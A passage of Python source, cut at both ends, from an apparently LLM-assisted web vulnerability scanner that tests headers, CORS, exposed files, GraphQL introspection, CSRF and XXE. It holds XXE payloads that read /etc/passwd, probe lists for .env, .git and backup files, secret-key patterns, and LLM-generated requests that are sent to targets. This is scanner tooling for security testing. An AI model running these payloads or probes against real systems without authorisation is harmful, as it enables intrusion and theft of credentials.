            # Try AI-based testing for unknown vuln types
            await self._ai_test_vulnerability(vuln_type)
            return

        for ep in self.recon.endpoints[:10]:
            url = _get_endpoint_url(ep)
            for param in list(self.recon.parameters.keys())[:5]:
                for payload in payloads:
                    await self._test_single_param(url, param, payload, vuln_type)

    async def _test_security_headers(self, vuln_type: str):
        """Test for security header vulnerabilities like clickjacking"""
        await self.log("info", f"  Testing security headers...")

        # Test main target and key pages
        test_urls = [self.target]
        for ep in self.recon.endpoints[:5]:
            url = _get_endpoint_url(ep) if isinstance(ep, dict) else ep
            if url and url not in test_urls:
                test_urls.append(url)

        for url in test_urls:
            if self.is_cancelled():
                return
            try:
                async with self.session.get(url, allow_redirects=True, timeout=self._get_request_timeout()) as resp:
                    headers = dict(resp.headers)
                    headers_lower = {k.lower(): v for k, v in headers.items()}

                    findings = []

                    # Check X-Frame-Options (Clickjacking)
                    x_frame = headers_lower.get("x-frame-options", "")
                    csp = headers_lower.get("content-security-policy", "")

                    if not x_frame and "frame-ancestors" not in csp.lower():
                        findings.append({
                            "type": "clickjacking",
                            "title": "Missing Clickjacking Protection",
                            "severity": "medium",
                            "description": "The page lacks X-Frame-Options header and CSP frame-ancestors directive, making it vulnerable to clickjacking attacks.",
                            "evidence": f"X-Frame-Options: Not set\nCSP: {csp[:100] if csp else 'Not set'}",
                            "remediation": "Add 'X-Frame-Options: DENY' or 'X-Frame-Options: SAMEORIGIN' header, or use 'frame-ancestors' in CSP."
                        })

                    # Check HSTS
                    hsts = headers_lower.get("strict-transport-security", "")
                    if not hsts and url.startswith("https"):
                        findings.append({
                            "type": "missing_hsts",
                            "title": "Missing HSTS Header",
                            "severity": "low",
                            "description": "HTTPS site without Strict-Transport-Security header, vulnerable to protocol downgrade attacks.",
                            "evidence": "Strict-Transport-Security: Not set",
                            "remediation": "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' header."
                        })

                    # Check X-Content-Type-Options
                    if "x-content-type-options" not in headers_lower:
                        findings.append({
                            "type": "missing_xcto",
                            "title": "Missing X-Content-Type-Options Header",
                            "severity": "low",
                            "description": "Missing nosniff header allows MIME-sniffing attacks.",
                            "evidence": "X-Content-Type-Options: Not set",
                            "remediation": "Add 'X-Content-Type-Options: nosniff' header."
                        })

                    # Check CSP
                    if not csp:
                        findings.append({
                            "type": "missing_csp",
                            "title": "Missing Content-Security-Policy Header",
                            "severity": "low",
                            "description": "No Content-Security-Policy header, increasing XSS risk.",
                            "evidence": "Content-Security-Policy: Not set",
                            "remediation": "Implement a restrictive Content-Security-Policy."
                        })

                    # Create findings (non-AI: detected by header inspection)
                    # Domain-scoped dedup: only 1 finding per domain for header issues
                    for f in findings:
                        mapped = self._map_vuln_type(f["type"])
                        vt = f["type"]

                        # Check if we already have this finding for this domain
                        if self.memory.has_finding_for(vt, url):
                            # Append URL to existing finding's affected_urls
                            for ef in self.memory.confirmed_findings:
                                if ef.vulnerability_type == vt:
                                    if url not in ef.affected_urls:
                                        ef.affected_urls.append(url)
                                    break
                            continue

                        finding = Finding(
                            id=hashlib.md5(f"{vt}{url}".encode()).hexdigest()[:8],
                            title=self.vuln_registry.get_title(mapped) or f["title"],
                            severity=self.vuln_registry.get_severity(mapped) or f["severity"],
                            vulnerability_type=vt,
                            cvss_score=self._get_cvss_score(vt),
                            cvss_vector=self._get_cvss_vector(vt),
                            cwe_id=self.vuln_registry.get_cwe_id(mapped) or "CWE-693",
                            description=self.vuln_registry.get_description(mapped) or f["description"],
                            affected_endpoint=url,
                            evidence=f["evidence"],
                            remediation=self.vuln_registry.get_remediation(mapped) or f["remediation"],
                            affected_urls=[url],
                            ai_verified=False  # Detected by inspection, not AI
                        )
                        await self._add_finding(finding)

            except Exception as e:
                await self.log("debug", f"  Header test error: {e}")

    async def _test_cors(self):
        """Test for CORS misconfigurations"""
        await self.log("info", f"  Testing CORS configuration...")

        test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null"
        ]

        for url in [self.target] + [_get_endpoint_url(ep) for ep in self.recon.endpoints[:3]]:
            if not url:
                continue

            for origin in test_origins:
                try:
                    headers = {"Origin": origin}
                    async with self.session.get(url, headers=headers) as resp:
                        acao = resp.headers.get("Access-Control-Allow-Origin", "")
                        acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                        if acao == origin or acao == "*":
                            # Domain-scoped dedup for CORS
                            if self.memory.has_finding_for("cors_misconfig", url):
                                for ef in self.memory.confirmed_findings:
                                    if ef.vulnerability_type == "cors_misconfig":
                                        if url not in ef.affected_urls:
                                            ef.affected_urls.append(url)
                                        break
                                break

                            severity = "high" if acac.lower() == "true" else "medium"
                            finding = Finding(
                                id=hashlib.md5(f"cors{url}{origin}".encode()).hexdigest()[:8],
                                title=self.vuln_registry.get_title("cors_misconfig") or f"CORS Misconfiguration - {origin}",
                                severity=severity,
                                vulnerability_type="cors_misconfig",
                                cvss_score=self._get_cvss_score("cors_misconfig"),
                                cvss_vector=self._get_cvss_vector("cors_misconfig"),
                                cwe_id=self.vuln_registry.get_cwe_id("cors_misconfig") or "CWE-942",
                                description=self.vuln_registry.get_description("cors_misconfig") or f"The server reflects the Origin header '{origin}' in Access-Control-Allow-Origin.",
                                affected_endpoint=url,
                                evidence=f"Origin: {origin}\nAccess-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                                remediation=self.vuln_registry.get_remediation("cors_misconfig") or "Configure CORS to only allow trusted origins.",
                                affected_urls=[url],
                                ai_verified=False  # Detected by inspection, not AI
                            )
                            await self._add_finding(finding)
                            await self.log("warning", f"  [FOUND] CORS misconfiguration at {url[:50]}")
                            break
                except Exception:
                    pass

    async def _test_information_disclosure(self):
        """Test for information disclosure"""
        await self.log("info", f"  Testing for information disclosure...")

        for url in [self.target] + [_get_endpoint_url(ep) for ep in self.recon.endpoints[:5]]:
            if not url:
                continue
            try:
                async with self.session.get(url) as resp:
                    headers = dict(resp.headers)

                    # Server header disclosure (domain-scoped: sensitive_data_exposure)
                    server = headers.get("Server", "")
                    if server and any(v in server.lower() for v in ["apache/", "nginx/", "iis/", "tomcat/"]):
                        vt = "sensitive_data_exposure"
                        dedup_key = f"server_version"
                        if self.memory.has_finding_for(vt, url, dedup_key):
                            for ef in self.memory.confirmed_findings:
                                if ef.vulnerability_type == vt and ef.parameter == dedup_key:
                                    if url not in ef.affected_urls:
                                        ef.affected_urls.append(url)
                                    break
                        else:
                            finding = Finding(
                                id=hashlib.md5(f"server{url}".encode()).hexdigest()[:8],
                                title="Server Version Disclosure",
                                severity="info",
                                vulnerability_type=vt,
                                cvss_score=0.0,
                                cwe_id="CWE-200",
                                description=f"The server discloses its version: {server}",
                                affected_endpoint=url,
                                parameter=dedup_key,
                                evidence=f"Server: {server}",
                                remediation="Remove or obfuscate the Server header to prevent version disclosure.",
                                affected_urls=[url],
                                ai_verified=False  # Detected by inspection
                            )
                            await self._add_finding(finding)

                    # X-Powered-By disclosure (domain-scoped: sensitive_data_exposure)
                    powered_by = headers.get("X-Powered-By", "")
                    if powered_by:
                        vt = "sensitive_data_exposure"
                        dedup_key = f"x_powered_by"
                        if self.memory.has_finding_for(vt, url, dedup_key):
                            for ef in self.memory.confirmed_findings:
                                if ef.vulnerability_type == vt and ef.parameter == dedup_key:
                                    if url not in ef.affected_urls:
                                        ef.affected_urls.append(url)
                                    break
                        else:
                            finding = Finding(
                                id=hashlib.md5(f"poweredby{url}".encode()).hexdigest()[:8],
                                title="Technology Version Disclosure",
                                severity="info",
                                vulnerability_type=vt,
                                cvss_score=0.0,
                                cwe_id="CWE-200",
                                description=f"The X-Powered-By header reveals technology: {powered_by}",
                                affected_endpoint=url,
                                parameter=dedup_key,
                                evidence=f"X-Powered-By: {powered_by}",
                                remediation="Remove the X-Powered-By header.",
                                affected_urls=[url],
                                ai_verified=False  # Detected by inspection
                            )
                            await self._add_finding(finding)
            except Exception:
                pass

    async def _test_misconfigurations(self):
        """Test for directory listing, debug mode, admin panels, API docs"""
        await self.log("info", "  Testing for misconfigurations...")

        # Common paths to check
        check_paths = {
            "directory_listing": ["/", "/assets/", "/images/", "/uploads/", "/static/", "/backup/"],
            "debug_mode": ["/debug", "/debug/", "/_debug", "/trace", "/elmah.axd", "/phpinfo.php"],
            "exposed_admin_panel": ["/admin", "/admin/", "/administrator", "/wp-admin", "/manager", "/dashboard", "/cpanel"],
            "exposed_api_docs": ["/swagger", "/swagger-ui", "/api-docs", "/docs", "/redoc", "/graphql", "/openapi.json"],
        }

        parsed_target = urlparse(self.target)
        base = f"{parsed_target.scheme}://{parsed_target.netloc}"

        for vuln_type, paths in check_paths.items():
            await self._wait_if_paused()
            if self.is_cancelled():
                return
            for path in paths:
                if self.is_cancelled():
                    return
                url = base + path
                try:
                    async with self.session.get(url, allow_redirects=False, timeout=self._get_request_timeout()) as resp:
                        status = resp.status
                        body = await resp.text()
                        headers = dict(resp.headers)

                        detected = False
                        evidence = ""

                        if vuln_type == "directory_listing" and status == 200:
                            if "Index of" in body or "Directory listing" in body or "<pre>" in body:
                                detected = True
                                evidence = f"Directory listing enabled at {path}"

                        elif vuln_type == "debug_mode" and status == 200:
                            debug_markers = ["stack trace", "traceback", "debug toolbar",
                                           "phpinfo()", "DJANGO_SETTINGS_MODULE", "laravel_debugbar"]
                            if any(m.lower() in body.lower() for m in debug_markers):
                                detected = True
                                evidence = f"Debug mode/info exposed at {path}"

                        elif vuln_type == "exposed_admin_panel" and status == 200:
                            admin_markers = ["login", "admin", "password", "sign in", "username"]
                            if sum(1 for m in admin_markers if m.lower() in body.lower()) >= 2:
                                detected = True
                                evidence = f"Admin panel found at {path}"

                        elif vuln_type == "exposed_api_docs" and status == 200:
                            doc_markers = ["swagger", "openapi", "api documentation", "graphql",
                                         "query {", "mutation {", "paths", "components"]
                            if any(m.lower() in body.lower() for m in doc_markers):
                                detected = True
                                evidence = f"API documentation exposed at {path}"

                        if detected:
                            if not self.memory.has_finding_for(vuln_type, url, ""):
                                info = self.vuln_registry.VULNERABILITY_INFO.get(vuln_type, {})
                                finding = Finding(
                                    id=hashlib.md5(f"{vuln_type}{url}".encode()).hexdigest()[:8],
                                    title=info.get("title", vuln_type.replace("_", " ").title()),
                                    severity=info.get("severity", "low"),
                                    vulnerability_type=vuln_type,
                                    cvss_score=self._get_cvss_score(vuln_type),
                                    cvss_vector=self._get_cvss_vector(vuln_type),
                                    cwe_id=info.get("cwe_id", "CWE-16"),
                                    description=info.get("description", evidence),
                                    affected_endpoint=url,
                                    evidence=evidence,
                                    remediation=info.get("remediation", "Restrict access to this resource."),
                                    affected_urls=[url],
                                    ai_verified=False
                                )
                                await self._add_finding(finding)
                                await self.log("warning", f"  [FOUND] {vuln_type} at {path}")
                                break  # One finding per vuln type is enough
                except Exception:
                    pass

    async def _test_data_exposure(self):
        """Test for source code disclosure, backup files, API key exposure"""
        await self.log("info", "  Testing for data exposure...")

        parsed_target = urlparse(self.target)
        base = f"{parsed_target.scheme}://{parsed_target.netloc}"

        exposure_checks = {
            "source_code_disclosure": {
                "paths": ["/.git/HEAD", "/.svn/entries", "/.env", "/wp-config.php.bak",
                          "/.htaccess", "/web.config", "/config.php~"],
                "markers": ["ref:", "svn", "DB_PASSWORD", "APP_KEY", "SECRET_KEY"],
            },
            "backup_file_exposure": {
                "paths": ["/backup.zip", "/backup.sql", "/db.sql", "/site.tar.gz",
                          "/backup.tar", "/.sql", "/dump.sql"],
                "markers": ["PK\x03\x04", "CREATE TABLE", "INSERT INTO", "mysqldump"],
            },
            "api_key_exposure": {
                "paths": ["/config.js", "/env.js", "/settings.json", "/.env.local",
                          "/api/config", "/static/js/app.*.js"],
                "markers": ["api_key", "apikey", "api-key", "secret_key", "access_token",
                           "AKIA", "sk-", "pk_live_", "ghp_", "glpat-"],
            },
        }

        for vuln_type, config in exposure_checks.items():
            await self._wait_if_paused()
            if self.is_cancelled():
                return
            for path in config["paths"]:
                if self.is_cancelled():
                    return
                url = base + path
                try:
                    async with self.session.get(url, allow_redirects=False, timeout=self._get_request_timeout()) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            body_bytes = body[:1000]
                            if any(m in body_bytes for m in config["markers"]):
                                if not self.memory.has_finding_for(vuln_type, url, ""):
                                    info = self.vuln_registry.VULNERABILITY_INFO.get(vuln_type, {})
                                    finding = Finding(
                                        id=hashlib.md5(f"{vuln_type}{url}".encode()).hexdigest()[:8],
                                        title=info.get("title", vuln_type.replace("_", " ").title()),
                                        severity=info.get("severity", "high"),
                                        vulnerability_type=vuln_type,
                                        cvss_score=self._get_cvss_score(vuln_type),
                                        cvss_vector=self._get_cvss_vector(vuln_type),
                                        cwe_id=info.get("cwe_id", "CWE-200"),
                                        description=f"Sensitive file exposed at {path}",
                                        affected_endpoint=url,
                                        evidence=f"HTTP 200 at {path} with sensitive content markers",
                                        remediation=info.get("remediation", "Remove or restrict access to this file."),
                                        affected_urls=[url],
                                        ai_verified=False
                                    )
                                    await self._add_finding(finding)
                                    await self.log("warning", f"  [FOUND] {vuln_type} at {path}")
                                    break
                except Exception:
                    pass

    async def _test_ssl_crypto(self):
        """Test for SSL/TLS issues and crypto weaknesses"""
        await self.log("info", "  Testing SSL/TLS configuration...")

        parsed = urlparse(self.target)

        # Check if site is HTTP-only (no HTTPS redirect)
        if parsed.scheme == "http":
            vt = "cleartext_transmission"
            if not self.memory.has_finding_for(vt, self.target, ""):
                https_url = self.target.replace("http://", "https://")
                has_https = False
                try:
                    async with self.session.get(https_url, timeout=5) as resp:
                        has_https = resp.status < 400
                except Exception:
                    pass
                if not has_https:
                    info = self.vuln_registry.VULNERABILITY_INFO.get(vt, {})
                    finding = Finding(
                        id=hashlib.md5(f"{vt}{self.target}".encode()).hexdigest()[:8],
                        title="Cleartext HTTP Transmission",
                        severity="medium",
                        vulnerability_type=vt,
                        cvss_score=self._get_cvss_score(vt),
                        cvss_vector=self._get_cvss_vector(vt),
                        cwe_id="CWE-319",
                        description="Application is served over HTTP without HTTPS.",
                        affected_endpoint=self.target,
                        evidence="No HTTPS endpoint available",
                        remediation=info.get("remediation", "Enable HTTPS with a valid TLS certificate."),
                        affected_urls=[self.target],
                        ai_verified=False
                    )
                    await self._add_finding(finding)

        # Check HSTS header
        try:
            async with self.session.get(self.target) as resp:
                headers = dict(resp.headers)
                if "Strict-Transport-Security" not in headers and parsed.scheme == "https":
                    vt = "ssl_issues"
                    if not self.memory.has_finding_for(vt, self.target, "hsts"):
                        finding = Finding(
                            id=hashlib.md5(f"hsts{self.target}".encode()).hexdigest()[:8],
                            title="Missing HSTS Header",
                            severity="low",
                            vulnerability_type=vt,
                            cvss_score=self._get_cvss_score(vt),
                            cwe_id="CWE-523",
                            description="Strict-Transport-Security header not set.",
                            affected_endpoint=self.target,
                            parameter="hsts",
                            evidence="HSTS header missing from HTTPS response",
                            remediation="Add Strict-Transport-Security header with appropriate max-age.",
                            affected_urls=[self.target],
                            ai_verified=False
                        )
                        await self._add_finding(finding)
        except Exception:
            pass

    async def _test_graphql_introspection(self):
        """Test for GraphQL introspection exposure"""
        await self.log("info", "  Testing for GraphQL introspection...")

        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        graphql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]

        introspection_query = '{"query":"{__schema{types{name}}}"}'

        for path in graphql_paths:
            url = base + path
            try:
                async with self.session.post(
                    url,
                    data=introspection_query,
                    headers={"Content-Type": "application/json"},
                ) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        if "__schema" in body or "queryType" in body:
                            vt = "graphql_introspection"
                            if not self.memory.has_finding_for(vt, url, ""):
                                info = self.vuln_registry.VULNERABILITY_INFO.get(vt, {})
                                finding = Finding(
                                    id=hashlib.md5(f"{vt}{url}".encode()).hexdigest()[:8],
                                    title="GraphQL Introspection Enabled",
                                    severity="medium",
                                    vulnerability_type=vt,
                                    cvss_score=self._get_cvss_score(vt),
                                    cvss_vector=self._get_cvss_vector(vt),
                                    cwe_id="CWE-200",
                                    description=info.get("description", "GraphQL introspection is enabled, exposing the full API schema."),
                                    affected_endpoint=url,
                                    evidence="__schema data returned from introspection query",
                                    remediation=info.get("remediation", "Disable introspection in production."),
                                    affected_urls=[url],
                                    ai_verified=False
                                )
                                await self._add_finding(finding)
                                await self.log("warning", f"  [FOUND] GraphQL introspection at {path}")
                                return
            except Exception:
                pass

    async def _test_csrf_inspection(self):
        """Test for CSRF protection on forms"""
        await self.log("info", "  Testing for CSRF protection...")

        for form in self.recon.forms[:10]:
            if form.get("method", "GET").upper() != "POST":
                continue
            action = form.get("action", "")
            inputs = form.get("inputs", [])

            # Check if form has CSRF token
            csrf_names = {"csrf", "_token", "csrfmiddlewaretoken", "authenticity_token",
                         "__RequestVerificationToken", "_csrf", "csrf_token"}
            has_token = any(
                inp.lower() in csrf_names
                for inp in inputs
                if isinstance(inp, str)
            )

            if not has_token and action:
                vt = "csrf"
                if not self.memory.has_finding_for(vt, action, ""):
                    info = self.vuln_registry.VULNERABILITY_INFO.get(vt, {})
                    finding = Finding(
                        id=hashlib.md5(f"{vt}{action}".encode()).hexdigest()[:8],
                        title="Missing CSRF Protection",
                        severity="medium",
                        vulnerability_type=vt,
                        cvss_score=self._get_cvss_score(vt),
                        cvss_vector=self._get_cvss_vector(vt),
                        cwe_id="CWE-352",
                        description=f"POST form at {action} lacks CSRF token protection.",
                        affected_endpoint=action,
                        evidence=f"No CSRF token found in form fields: {inputs[:5]}",
                        remediation=info.get("remediation", "Implement CSRF tokens for all state-changing requests."),
                        affected_urls=[action],
                        ai_verified=False
                    )
                    await self._add_finding(finding)
                    await self.log("warning", f"  [FOUND] Missing CSRF protection at {action[:50]}")

    async def _ai_dynamic_test(self, user_prompt: str):
        """
        AI-driven dynamic vulnerability testing - can test ANY vulnerability type.
        The LLM generates payloads, test strategies, and analyzes results dynamically.

        Examples of what this can test:
        - XXE (XML External Entity)
        - Race Conditions
        - Rate Limiting Bypass
        - WAF Bypass
        - CSP Bypass
        - BFLA (Broken Function Level Authorization)
        - BOLA (Broken Object Level Authorization)
        - JWT vulnerabilities
        - GraphQL injection
        - NoSQL injection
        - Prototype pollution
        - And ANY other vulnerability type!
        """
        await self.log("info", f"[AI DYNAMIC TEST] Processing: {user_prompt}")

        if not self.llm.is_available():
            await self.log("warning", "  LLM not available - attempting basic tests based on prompt")
            await self._ai_test_fallback(user_prompt)
            return

        # Gather reconnaissance context
        endpoints_info = []
        for ep in self.recon.endpoints[:15]:
            url = _get_endpoint_url(ep)
            method = _get_endpoint_method(ep)
            if url:
                endpoints_info.append({"url": url, "method": method})

        forms_info = []
        for form in self.recon.forms[:5]:
            if isinstance(form, dict):
                forms_info.append({
                    "action": form.get("action", ""),
                    "method": form.get("method", "GET"),
                    "inputs": form.get("inputs", [])[:5]
                })

        context = f"""
TARGET: {self.target}
TECHNOLOGIES: {', '.join(self.recon.technologies) if self.recon.technologies else 'Unknown'}
ENDPOINTS ({len(endpoints_info)} found):
{json.dumps(endpoints_info[:10], indent=2)}

FORMS ({len(forms_info)} found):
{json.dumps(forms_info, indent=2)}

PARAMETERS DISCOVERED: {list(self.recon.parameters.keys())[:20]}
"""

        # Phase 1: Ask AI to understand the vulnerability and create test strategy
        strategy_prompt = f"""You are an expert penetration tester. The user wants to test for:

"{user_prompt}"

Based on the target information below, create a comprehensive testing strategy.

{context}

Respond in JSON format with:
{{
    "vulnerability_type": "name of the vulnerability being tested",
    "cwe_id": "CWE-XXX if applicable",
    "owasp_category": "OWASP category if applicable",
    "description": "Brief description of what this vulnerability is",
    "severity_if_found": "critical|high|medium|low",
    "cvss_estimate": 0.0-10.0,
    "test_cases": [
        {{
            "name": "Test case name",
            "technique": "Technique being used",
            "url": "URL to test (use actual URLs from context)",
            "method": "GET|POST|PUT|DELETE",
            "headers": {{"Header-Name": "value"}},
            "body": "request body if POST/PUT",
            "content_type": "application/json|application/xml|application/x-www-form-urlencoded",
            "success_indicators": ["what to look for in response that indicates vulnerability"],
            "failure_indicators": ["what indicates NOT vulnerable"]
        }}
    ],
    "payloads": ["list of specific payloads to try"],
    "analysis_tips": "What patterns or behaviors indicate this vulnerability"
}}

Generate at least 3-5 realistic test cases using the actual endpoints from the context.
Be creative and thorough - think like a real penetration tester."""

        await self.log("info", "  Phase 1: AI generating test strategy...")

        try:
            strategy = await self.llm.generate_json(
                strategy_prompt,
                get_system_prompt("strategy"),
                task_type="test_strategy",
            )

            if not strategy:
                await self.log("warning", "  AI did not return valid JSON strategy, using fallback")
                await self._ai_test_fallback(user_prompt)
                return

            vuln_type = strategy.get("vulnerability_type", user_prompt)
            cwe_id = strategy.get("cwe_id", "")
            severity = strategy.get("severity_if_found", "medium")
            cvss = strategy.get("cvss_estimate", 5.0)
            description = strategy.get("description", f"Testing for {vuln_type}")

            await self.log("info", f"  Vulnerability: {vuln_type}")
            await self.log("info", f"  CWE: {cwe_id} | Severity: {severity} | CVSS: {cvss}")
            await self.log("info", f"  Test cases: {len(strategy.get('test_cases', []))}")

            # Phase 2: Execute test cases
            await self.log("info", "  Phase 2: Executing AI-generated test cases...")

            test_results = []
            for i, test_case in enumerate(strategy.get("test_cases", [])[:10]):
                test_name = test_case.get("name", f"Test {i+1}")
                await self.log("debug", f"    Running: {test_name}")

                result = await self._execute_ai_dynamic_test(test_case)
                if result:
                    result["test_name"] = test_name
                    result["success_indicators"] = test_case.get("success_indicators", [])
                    result["failure_indicators"] = test_case.get("failure_indicators", [])
                    test_results.append(result)

            # Phase 3: AI analysis of results
            await self.log("info", "  Phase 3: AI analyzing results...")

            analysis_prompt = f"""Analyze these test results for {vuln_type} vulnerability.

VULNERABILITY BEING TESTED: {vuln_type}
{description}

ANALYSIS TIPS: {strategy.get('analysis_tips', 'Look for error messages, unexpected behavior, or data leakage')}

TEST RESULTS:
{json.dumps(test_results[:5], indent=2, default=str)[:8000]}

For each test result, analyze if it indicates a vulnerability.
Consider:
- Success indicators: {strategy.get('test_cases', [{}])[0].get('success_indicators', [])}
- Response status codes, error messages, timing differences, data in response

Respond in JSON:
{{
    "findings": [
        {{
            "is_vulnerable": true|false,
            "confidence": "high|medium|low",
            "test_name": "which test",
            "evidence": "specific evidence from response",
            "explanation": "why this indicates vulnerability"
        }}
    ],
    "overall_assessment": "summary of findings",
    "recommendations": ["list of remediation steps"]
}}"""

            analysis = await self.llm.generate_json(
                analysis_prompt,
                get_system_prompt("confirmation"),
                task_type="test_analysis",
            )

            if analysis:
                for finding_data in analysis.get("findings", []):
                    if finding_data.get("is_vulnerable") and finding_data.get("confidence") in ["high", "medium"]:
                        evidence = finding_data.get("evidence", "")
                        test_name = finding_data.get("test_name", "AI Test")

                        # Find the matching test result for endpoint + body
                        affected_endpoint = self.target
                        matched_body = ""
                        for tr in test_results:
                            if tr.get("test_name") == test_name:
                                affected_endpoint = tr.get("url", self.target)
                                matched_body = tr.get("body", "")
                                break

                        # Anti-hallucination: verify AI evidence in actual response
                        if evidence and matched_body:
                            if not self._evidence_in_response(evidence, matched_body):
                                await self.log("debug", f"  [REJECTED] AI claimed evidence not found in response for {test_name}")
                                self.memory.reject_finding(
                                    type("F", (), {"vulnerability_type": vuln_type, "affected_endpoint": affected_endpoint, "parameter": ""})(),
                                    f"AI evidence not grounded in HTTP response: {evidence[:100]}"
                                )
                                continue

                        # Get metadata from registry if available
                        mapped = self._map_vuln_type(vuln_type.lower().replace(" ", "_"))
                        reg_title = self.vuln_registry.get_title(mapped)
                        reg_cwe = self.vuln_registry.get_cwe_id(mapped)
                        reg_remediation = self.vuln_registry.get_remediation(mapped)

                        finding = Finding(
                            id=hashlib.md5(f"{vuln_type}{affected_endpoint}{test_name}".encode()).hexdigest()[:8],
                            title=reg_title or f"{vuln_type}",
                            severity=severity,
                            vulnerability_type=vuln_type.lower().replace(" ", "_"),
                            cvss_score=float(cvss) if cvss else 5.0,
                            cvss_vector=self._get_cvss_vector(vuln_type.lower().replace(" ", "_")),
                            cwe_id=reg_cwe or cwe_id or "",
                            description=f"{description}\n\nAI Explanation: {finding_data.get('explanation', '')}",
                            affected_endpoint=affected_endpoint,
                            evidence=evidence[:1000],
                            remediation=reg_remediation or "\n".join(analysis.get("recommendations", [])),
                            ai_verified=True
                        )
                        await self._add_finding(finding)
                        await self.log("warning", f"  [AI FOUND] {vuln_type} - {finding_data.get('confidence')} confidence")

                await self.log("info", f"  Assessment: {analysis.get('overall_assessment', 'Analysis complete')[:100]}")

        except json.JSONDecodeError as e:
            await self.log("warning", f"  JSON parse error: {e}")
            await self._ai_test_fallback(user_prompt)
        except Exception as e:
            await self.log("error", f"  AI dynamic test error: {e}")
            await self._ai_test_fallback(user_prompt)

    async def _execute_ai_dynamic_test(self, test_case: Dict) -> Optional[Dict]:
        """Execute a single AI-generated test case"""
        if not self.session:
            return None

        try:
            url = test_case.get("url", self.target)
            method = test_case.get("method", "GET").upper()
            headers = test_case.get("headers", {})
            body = test_case.get("body", "")
            content_type = test_case.get("content_type", "")

            if content_type and "Content-Type" not in headers:
                headers["Content-Type"] = content_type

            start_time = asyncio.get_event_loop().time()

            if method == "GET":
                async with self.session.get(url, headers=headers, allow_redirects=False) as resp:
                    response_body = await resp.text()
                    response_time = asyncio.get_event_loop().time() - start_time
                    return {
                        "url": url,
                        "method": method,
                        "status": resp.status,
                        "headers": dict(list(resp.headers.items())[:20]),
                        "body_preview": response_body[:2000],
                        "body_length": len(response_body),
                        "response_time": round(response_time, 3)
                    }
            elif method == "POST":
                if content_type == "application/json" and isinstance(body, str):
                    try:
                        body = json.loads(body)
                    except Exception:
                        pass
                async with self.session.post(url, headers=headers, data=body if isinstance(body, str) else None, json=body if isinstance(body, dict) else None, allow_redirects=False) as resp:
                    response_body = await resp.text()
                    response_time = asyncio.get_event_loop().time() - start_time
                    return {
                        "url": url,
                        "method": method,
                        "status": resp.status,
                        "headers": dict(list(resp.headers.items())[:20]),
                        "body_preview": response_body[:2000],
                        "body_length": len(response_body),
                        "response_time": round(response_time, 3)
                    }
            elif method in ["PUT", "DELETE", "PATCH"]:
                request_method = getattr(self.session, method.lower())
                async with request_method(url, headers=headers, data=body, allow_redirects=False) as resp:
                    response_body = await resp.text()
                    response_time = asyncio.get_event_loop().time() - start_time
                    return {
                        "url": url,
                        "method": method,
                        "status": resp.status,
                        "headers": dict(list(resp.headers.items())[:20]),
                        "body_preview": response_body[:2000],
                        "body_length": len(response_body),
                        "response_time": round(response_time, 3)
                    }
        except Exception as e:
            return {
                "url": url,
                "method": method,
                "error": str(e),
                "status": 0
            }
        return None

    async def _ai_test_fallback(self, user_prompt: str):
        """Fallback testing when LLM is not available - uses keyword detection"""
        await self.log("info", f"  Running fallback tests for: {user_prompt}")
        prompt_lower = user_prompt.lower()

        # Define fallback test mappings
        fallback_tests = {
            "xxe": self._test_xxe_fallback,
            "xml": self._test_xxe_fallback,
            "race": self._test_race_condition_fallback,
            "rate": self._test_rate_limit_fallback,
            "bola": self._test_idor_fallback,
            "idor": self._test_idor_fallback,
            "bfla": self._test_bfla_fallback,
            "jwt": self._test_jwt_fallback,
            "graphql": self._test_graphql_fallback,
            "nosql": self._test_nosql_fallback,
            "waf": self._test_waf_bypass_fallback,
            "csp": self._test_csp_bypass_fallback,
        }

        tests_run = False
        for keyword, test_func in fallback_tests.items():
            if keyword in prompt_lower:
                await test_func()
                tests_run = True

        if not tests_run:
            await self.log("warning", "  No fallback test matched. LLM required for this test type.")

    async def _test_xxe_fallback(self):
        """Test for XXE without LLM"""
        await self.log("info", "  Testing XXE (XML External Entity)...")

        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>',
        ]

        for endpoint in [self.target] + [_get_endpoint_url(ep) for ep in self.recon.endpoints[:5]]:
            if not endpoint:
                continue
            for payload in xxe_payloads:
                try:
                    headers = {"Content-Type": "application/xml"}
                    async with self.session.post(endpoint, data=payload, headers=headers) as resp:
                        body = await resp.text()
                        if "root:" in body or "daemon:" in body or "ENTITY" in body.lower():
                            finding = Finding(
                                id=hashlib.md5(f"xxe{endpoint}".encode()).hexdigest()[:8],
                                title="XXE (XML External Entity) Injection",
                                severity="critical",
                                vulnerability_type="xxe",
                                cvss_score=9.1,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                cwe_id="CWE-611",
                                description="XML External Entity injection allows reading local files and potentially SSRF.",
                                affected_endpoint=endpoint,
                                payload=payload[:200],
                                evidence=body[:500],
                                remediation="Disable external entity processing in XML parsers. Use JSON instead of XML where possible.",
                                ai_verified=False
                            )
                            await self._add_finding(finding)
                            await self.log("warning", f"  [FOUND] XXE at {endpoint[:50]}")
                            return
                except Exception:
                    pass

    async def _test_race_condition_fallback(self):
        """Test for race conditions without LLM"""
        await self.log("info", "  Testing Race Conditions...")

        # Find form endpoints that might be vulnerable
        target_endpoints = []
        for form in self.recon.forms[:3]:
            if isinstance(form, dict):
                action = form.get("action", "")
                if action:
                    target_endpoints.append(action)

        if not target_endpoints:
            target_endpoints = [_get_endpoint_url(ep) for ep in self.recon.endpoints[:3] if _get_endpoint_url(ep)]

        for endpoint in target_endpoints:
            try:
                # Send multiple concurrent requests
                tasks = []
                for _ in range(10):
                    tasks.append(self.session.get(endpoint))

                responses = await asyncio.gather(*[task.__aenter__() for task in tasks], return_exceptions=True)

                # Check for inconsistent responses (potential race condition indicator)
